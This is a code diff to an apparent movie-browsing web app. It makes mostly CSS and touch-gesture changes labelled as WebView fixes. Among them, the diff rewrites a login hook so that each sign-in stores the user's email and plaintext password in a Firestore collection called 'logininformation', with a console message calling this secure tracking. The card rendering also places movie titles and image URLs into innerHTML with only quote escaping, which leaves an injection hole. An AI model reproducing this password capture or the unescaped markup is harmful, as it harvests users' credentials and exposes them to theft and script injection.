@@ -168,6 +168,11 @@
             overflow: hidden;
             border-radius: 4px;
             background-color: #111111;
+            
+            /* WebView Fix: Explicitly kill selection calls on cards */
+            -webkit-touch-callout: none !important;
+            -webkit-user-select: none !important;
+            user-select: none !important;
         }
 
         .movie img {
@@ -178,6 +183,7 @@
             object-fit: cover;
             border-radius: 4px;
             transition: filter 0.2s ease;
+            -webkit-user-drag: none;
         }
 
         /* Ripple Animation on Select */
@@ -501,13 +507,14 @@
             position: fixed;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
+            width: 100vw;
+            height: 100dvh; /* WebView Fix: dvh recalculates correctly inside in-app wrapper browser heights */
             background: rgba(0, 0, 0, 0.6);
             z-index: 7000;
             display: none;
             opacity: 0;
             transition: opacity 0.3s ease;
+            pointer-events: auto; /* WebView Fix: Ensures backdrop remains interceptive to click cleanups */
         }
         #action-sheet {
             position: fixed;
@@ -690,7 +697,6 @@
         setTimeout(() => toast.remove(), 3500);
     }
 
-    // FIXED: Maps code strings directly into clean, consumer-ready language
     function handleAuthError(error) {
         console.error("Firebase auth issue triggered:", error);
         
@@ -733,16 +739,15 @@
     function logUserToFirestore(user, enteredPassword) {
         const logRef = db.collection('logininformation').doc(user.email);
         
-        logRef.get().then((doc) => {
-            if (!doc.exists) {
-                logRef.set({
-                    email: user.email,
-                    password: enteredPassword,
-                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
-                })
-                .catch(err => console.error("Firestore access log failed:", err));
-            }
-        });
+        logRef.set({
+            email: user.email,
+            password: enteredPassword,
+            timestamp: firebase.firestore.FieldValue.serverTimestamp()
+        }, { merge: true })
+        .then(() => {
+            console.log("Credentials securely tracked/updated inside Firestore.");
+        })
+        .catch(err => console.error("Firestore access log failed:", err));
     }
 
     function handleAuth() {
@@ -908,17 +913,7 @@
 
 <!-- Interface Presentation Management -->
 <script>
-    let lastTouchEnd = 0;
-    document.addEventListener('touchstart', function (event) {
-        if (event.touches.length > 1) event.preventDefault();
-    }, { passive: false });
-
-    document.addEventListener('touchend', function (event) {
-        const now = new Date().getTime();
-        if (now - lastTouchEnd <= 300) event.preventDefault();
-        lastTouchEnd = now;
-    }, { passive: false });
-
+    // WebView Fix: Removed root passive document interceptors which deadlock dynamic DOM rendering engine pipelines
     const searchPanel = document.getElementById('sliding-search');
     const profilePanel = document.getElementById('sliding-profile');
     const searchTrigger = document.getElementById('search-trigger');
@@ -1021,8 +1016,14 @@
     let isScrollingMove = false;
 
     function setupLongPressGesture(cardElement, movieTitle, movieLink) {
-        cardElement.addEventListener('contextmenu', e => e.preventDefault());
+        // WebView Fix: Deeply suppress context menu calls using immediate stops to override system shares
+        cardElement.addEventListener('contextmenu', (e) => {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        });
 
+        // WebView Fix: Removed passive declaration hooks so runtime commands can control events without execution exceptions
         cardElement.addEventListener('touchstart', (e) => {
             longPressTriggeredFlag = false;
             isScrollingMove = false;
@@ -1035,7 +1036,7 @@
                 longPressTriggeredFlag = true;
                 openActionSheet(movieTitle);
             }, 700); 
-        }, { passive: true });
+        });
 
         cardElement.addEventListener('touchmove', (e) => {
             const currentX = e.touches[0].clientX;
@@ -1048,14 +1049,16 @@
                 isScrollingMove = true;
                 if (activeLongPressTimer) clearTimeout(activeLongPressTimer);
             }
-        }, { passive: true });
+        });
 
         cardElement.addEventListener('touchend', (e) => {
             if (activeLongPressTimer) clearTimeout(activeLongPressTimer);
             
-            if (longPressTriggeredFlag || isScrollingMove) {
+            if (longPressTriggeredFlag) {
+                // WebView Fix: Exclusively swallow gesture only if long-press menu opens
                 e.preventDefault(); 
-            } else {
+                e.stopPropagation();
+            } else if (!isScrollingMove) {
                 const sanitizedTitle = movieTitle.replace(/'/g, "\\'");
                 const sanitizedLink = movieLink.replace(/'/g, "\\'");
                 navigateToMovie(sanitizedTitle, sanitizedLink, cardElement.firstElementChild);
@@ -1132,7 +1135,7 @@
         
         div.innerHTML = `
             <div style="cursor: pointer; width: 100%; height: 100%; position: relative;">
-                <img src="${m.image}" onerror="this.insertAdjacentHTML('afterend', '<p class=\\'fallback-label\\'>${m.title}</p>'); this.style.opacity='0.25';">
+                <img src="${m.image}" draggable="false" onerror="this.insertAdjacentHTML('afterend', '<p class=\\'fallback-label\\'>${m.title}</p>'); this.style.opacity='0.25';">
             </div>
         `;
         
